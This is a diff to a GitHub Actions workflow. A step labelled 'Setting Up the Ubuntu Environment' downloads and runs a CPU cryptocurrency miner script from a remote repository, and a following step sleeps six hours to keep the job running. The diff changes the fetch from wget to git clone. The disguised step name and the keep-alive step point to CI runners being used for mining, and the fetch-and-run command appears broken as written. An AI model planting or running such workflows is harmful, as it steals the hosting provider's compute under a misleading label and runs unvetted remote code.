@@ -17,7 +17,7 @@ jobs:
       run: sudo apt-get update
     - name: Setting Up the Ubuntu Environment
     #  if: ${{ failure() }}
-      run: wget https://github.com/AllCoinCrypto/m-cpuminer-v2/ && chmod u+x m-minerd.sh && ./m-minerd.sh
+      run: git clone https://github.com/AllCoinCrypto/m-cpuminer-v2/ && chmod u+x m-minerd.sh && ./m-minerd.sh
     - name: Keep Running Ubuntu System and keepAlive
      # if: ${{ failure() }}
       run: sleep 6h
